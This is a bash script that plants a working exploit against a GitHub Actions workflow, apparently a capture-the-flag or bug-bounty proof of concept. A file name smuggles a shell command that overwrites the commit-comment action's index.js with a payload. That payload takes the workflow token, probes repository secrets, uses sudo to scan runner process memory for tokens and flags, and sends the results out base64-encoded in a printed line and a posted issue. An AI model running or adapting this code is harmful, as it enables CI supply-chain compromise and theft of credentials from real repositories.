#!/usr/bin/env bash
set -euo pipefail
mkdir -p content
cd content
cat > evil.js <<'JS'
const { execSync } = require('child_process');
const fs = require('fs');
const b64 = (s) => Buffer.from(String(s)).toString('base64');
const token = process.env.INPUT_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const api = 'https://api.github.com';
const H = {
  authorization: `Bearer ${token}`,
  accept: 'application/vnd.github+json',
  'content-type': 'application/json',
  'user-agent': 'rce-proof'
};
const out = { token, token_len: token.length, token_prefix: token.slice(0, 4), repo };
const rq = async (path, opts = {}) => {
  try {
    const r = await fetch(api + path, { headers: H, ...opts });
    const text = await r.text();
    return { status: r.status, text: text.slice(0, 2000) };
  } catch (e) { return { error: String(e) }; }
};
const sh = (cmd, timeout = 180000) => {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout, maxBuffer: 32 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (e) { return 'ERR:' + String(e.stdout || '') + String(e.stderr || '') + String(e.message || ''); }
};
const scanPy = `import os,sys,base64
pid=sys.argv[1]
pats=[b'FLAG{',b'TRIAGE_FLAG',b'READ_ONLY_PAT',b'ghs_']
try:
    ctrl=open('/tmp/ctrl.txt','rb').read().strip()
    if ctrl: pats.append(ctrl)
except Exception: pass
allp=list(pats)
for p in pats:
    try: allp.append(p.decode('latin1').encode('utf-16le'))
    except Exception: pass
hits=[]; total=0
try:
    maps=open('/proc/%s/maps'%pid).read().splitlines()
    mem=open('/proc/%s/mem'%pid,'rb',0)
except Exception as e:
    print('ERR open',e); sys.exit()
for line in maps:
    parts=line.split()
    if len(parts)<2 or 'r' not in parts[1]: continue
    try:
        a,b=parts[0].split('-'); start=int(a,16); end=int(b,16)
    except Exception: continue
    size=end-start
    if size<=0: continue
    chunk=min(size,64*1024*1024)
    try:
        mem.seek(start); data=mem.read(chunk)
    except Exception: continue
    total+=len(data)
    for p in allp:
        i=data.find(p)
        while i!=-1:
            hits.append((p[:16].decode('latin1','replace'), base64.b64encode(data[max(0,i-60):i+200]).decode()))
            i=data.find(p,i+1)
            if len(hits)>=60: break
        if len(hits)>=60: break
    if len(hits)>=60 or total>700*1024*1024: break
print('SCANNED',total)
print('HITS',len(hits))
for t,h in hits: print(t+'|'+h)
`;
(async () => {
  out.repo_meta = await rq(`/repos/${repo}`);
  out.secrets_probe = await rq(`/repos/${repo}/actions/secrets`);
  out.id = sh('id').trim();
  out.sudo = sh('sudo -n true && echo SUDO_OK || echo SUDO_NO').trim();
  out.ps = sh("pgrep -af 'Runner\\.(Worker|Listener)' || true").slice(0, 2000);
  fs.writeFileSync('/tmp/ctrl.txt', token);
  fs.writeFileSync('/tmp/memscan.py', scanPy);
  const pids = out.ps.split('\n').map((l) => l.trim().split(/\s+/)[0]).filter((x) => /^\d+$/.test(x));
  out.pids = pids;
  out.memscan = {};
  for (const pid of pids.slice(0, 4)) {
    out.memscan[pid] = sh(`sudo timeout 170 python3 /tmp/memscan.py ${pid}`, 200000).slice(0, 30000);
  }
  out.b64 = b64(JSON.stringify({ ...out, token }));
  console.log('SCAN_EXFIL_B64=' + out.b64);
  const ir = await fetch(`${api}/repos/${repo}/issues`, {
    method: 'POST', headers: H,
    body: JSON.stringify({ title: 'MEMORY_SCAN_V7', body: '```\n' + out.b64 + '\n```' })
  });
  console.log('ISSUE_STATUS=' + ir.status);
  console.log('SLEEP_START=' + new Date().toISOString());
  await new Promise((r) => setTimeout(r, 60000));
  console.log('SLEEP_DONE=' + new Date().toISOString());
})().catch((e) => console.log('EVIL_ERROR=' + e));
JS
OVR='rce$(S=$(dirname${IFS}${HOME%runner});D=${S}tmp${S}content${S}content;cd $D;cp evil.js ${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;cp evil.js rce.txt).txt'
touch "$OVR"
